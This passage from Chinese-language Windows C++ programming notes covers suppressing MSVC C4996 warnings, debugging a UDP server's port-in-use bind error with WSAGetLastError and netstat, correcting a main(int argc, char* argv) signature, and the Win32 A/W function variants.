2. 在程序的首行添加 `#define _CRT_SECURE_NO_WARNINGS`【只能放在程序首行】
3. 在项目处右键点击找到属性，点击配置属性，【C/C++ \| SDL检查： 改成否】
4. 项目 \| 项目属性 \| C/C++ \| 预处理器定义，添加：`_CRT_NONSTDC_NO_DEPRECATE`和`_CRT_SECURE_NO_WARNINGS`
5. 项目 | 项目属性 \| C/C++ |  所有选项：禁用特定警告【填写4996】

> 以上4种方案，亲测全部有效（win7、vs2015）

 

 <br>

 

## 11.2 UDP服务端`bind`错误的调试方法

>  针对`3.4.2`节中的服务端bind错误，调试方法如下

- 首先修改代码，打印错误号：【`WSAGetLastError()函数获取错误号`】【得到错误号`10048`】

```c++
#include <stdio.h>//printf
#include <iostream>
#include <WinSock2.h>

#include <time.h>

#pragma comment(lib,"ws2_32.lib")

int getCurrentTimeStr(char* strtime);
void ErrorHandling(const char* message, int ERRNO);


int main()
{
	printf("UDP Server\n");
	//0 初始化网络库
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0)//2 2 表示WinSock2.h的二版本
	{
		ErrorHandling("WSAStartup() error!", WSAGetLastError());
	}

	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)//2表示WinSock2.h的二版本
	{
		WSACleanup();
		return -1;
	}

	char ch[64] = { 0 };//存储时间

	//1 创建socket
	SOCKET  sockServ = socket(AF_INET, SOCK_DGRAM, 0);//udp ipv4
	if (sockServ == INVALID_SOCKET)
	{
		ErrorHandling("Server socket Error!", WSAGetLastError());
		return -1;//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败】
	}

	//2 bind 分配地址和端口
	SOCKADDR_IN addrServ, addrClient;
	memset(&addrServ, 0, sizeof(addrServ));
	memset(&addrClient, 0, sizeof(addrClient));
	int szAddrCnt = sizeof(addrClient);

	addrServ.sin_family = AF_INET;
	addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServ.sin_port = htons(6001);
	int ret = bind(sockServ, (sockaddr*)&addrServ, sizeof(addrServ));
	if (SOCKET_ERROR == ret)
	{
		//printf("Bind ERROR:%d\n",WSAGetLastError());
		ErrorHandling("Bind ERROR", WSAGetLastError());
		return -1;
	}

	//3 等待收发数据【阻塞】[直接接到服务端socket]
	char recvBuf[100] = { 0 };
	char sendBuf[100] = { 0 };

	while (true)
	{
		printf("Wait Message:\n");
		recvfrom(sockServ, recvBuf, sizeof(recvBuf), 0, (sockaddr*)&addrClient, &szAddrCnt);
		std::cout << recvBuf << std::endl;

		sprintf_s(sendBuf, sizeof(sendBuf), "Ack: %s\n", recvBuf);
		sendto(sockServ, sendBuf, strlen(sendBuf) + 1, 0, (sockaddr*)&addrClient, szAddrCnt);
	}
	//7 关闭总机
	closesocket(sockServ);

	system("pause");
	return 0;
}


#pragma warning(disable:4996)
int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}
void ErrorHandling(const char* message, int ERRNO)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	//printf("Error num = %d, Error time %s\n", ::GetLastError(), ch);
	printf("Error num = %d, Error time %s\n", ERRNO, ch);
	system("pause");
	exit(-1);
}
```



- 在【工具：错误查找】中查找错误代码`10048`：通常每个套接字地址(协议/网络地址/端口)只允许使用一次。 

- 验证：【cmd：`Netstat -ano`】获取网络端口占用情况

  ![](W-11-1.png)

> `netstat` 命令用于显示各种网络相关信息，如网络连接，路由表，接口状态 (Interface Statistics)，masquerade 连接，多播成员 (Multicast Memberships) 等等。

- 验证：在任务管理器中寻找`PID=6696`的进程

  ![](W-11-2.png)



<br>

## 11.3 程序内获取命令行参数出错

> windows下，VS调试命令行程序，可以在【属性 | 调试 | 命令行参数】处设置传入的命令行参数

```c++
#include <stdio.h>
#include <iostream>

int main(int argc, char* argv)
{
	printf("start:\n");
	if (argc < 2)
	{
		puts("Must input two args[Start in CMD]\n");
		system("pause");
		exit(-1);
	}
	else
	{
		//szName = arg[1];//注意下面的写法
		//printf("%s", argv);
		std::cout << "NAME:" << argv[1] << std::endl;
	}
	printf("Client begin:\n");

	system("pause");
	return 0;
}
```

**解决**：修改`char* argv` 为指针数组

- `argc`（argument count）：表示命令行参数的数量，包括程序名称本身。
- `argv`（argument vector）：是一个指向指针数组的指针，其中每个指针指向一个表示命令行参数的C字符串。

```c++
#include <stdio.h>
#include <iostream>

int main(int argc, char* argv[])
{
	printf("start:\n");
	if (argc < 2)
	{
		puts("Must input two args[Start in CMD]\n");
		system("pause");
		exit(-1);
	}
	else
	{
		//szName = arg[1];//注意下面的写法
		//printf("%s", argv);
		std::cout << "NAME:" << argv[1] << std::endl;
	}
	printf("Client begin:\n");

	system("pause");
	return 0;
}
```

因此，这是一个语法错误。查阅Microsoft文档，可知 main 函数的定义：

```c++
//main 函数没有声明，因为它内置于语言中。 如果有，则 main 的声明语法如下所示：
int main();
int main(int argc, char *argv[]);
//如果 main 中未指定返回值，编译器会提供零作为返回值。
```

如果将源代码设计为使用 Unicode 宽 character，则可以使用特定于 Microsoft 的 `wmain` 入口点，即宽 character 版的 `main`。 下面是 `wmain` 的有效声明语法：

```cpp
int wmain();
int wmain(int argc, wchar_t *argv[]);
```

还可以使用特定于 Microsoft 的 `_tmain`，它是 *`tchar.h`* 中定义的预处理器宏。 除非定义了 `_UNICODE`，否则 `_tmain` 解析为 `main`。 在该示例中，`_tmain` 将解析为 `wmain`。 对于需要分别生成窄版和宽版 character 集的代码来说，`_tmain` 宏和以 `_t` 开头的其他宏非常有用。 有关详细信息，请参阅[使用一般文本映射](https://learn.microsoft.com/zh-cn/cpp/c-runtime-library/using-generic-text-mappings?view=msvc-170)。

<br>

## 11.4 `windows.h`头文件的首字母大写

在C++中有这样两个头文件就像双胞胎一样，它们分别是

```c++
#include<Windows.h>
#include<windows.h>
```

二者在功能上没有区别，且二者库中的函数都是相同的

二者在用途上有区别：

- 控制台程序中我们常用`windows.h`，而在MFC等窗口或SDK程序中，我们常用`Windows.h`
- 这是因为Linux系统对文件的大小写比较敏感，而Windows相对而言没有那么严格。

<br>

## 11.5 Win API 中的A/W版本函数

在 Win32 API 中，函数名后的 “A” 和 “W” 后缀代表了该函数的 ANSI 和 Unicode 版本。在早期的 Windows 系统中，ANSI 版本是使用单字节字符集（主要是 ASCII），而 Unicode 版本支持更广泛的双字节字符集，包括多种语言字符。

- “A” 后缀：代表 ANSI 版本。这个版本的函数使用单字节字符集，主要是 ASCII。例如，WNDCLASSA 是一个处理 ANSI 窗口类的结构。
- “W” 后缀：代表 Unicode 版本。这个版本的函数使用双字节字符集，支持多种语言字符。例如，WNDCLASSW 是一个处理 Unicode 窗口类的结构。

在现代的 Windows 系统中，推荐总是使用 `Unicode` 版本，因为它支持更广泛的字符集，并且在很多情况下，使用 Unicode 版本的函数不需要额外的工作。然而，如果你在处理的都是 ASCII 字符，并且出于某种原因需要节省内存或处理速度，那么可以使用 ANSI 版本。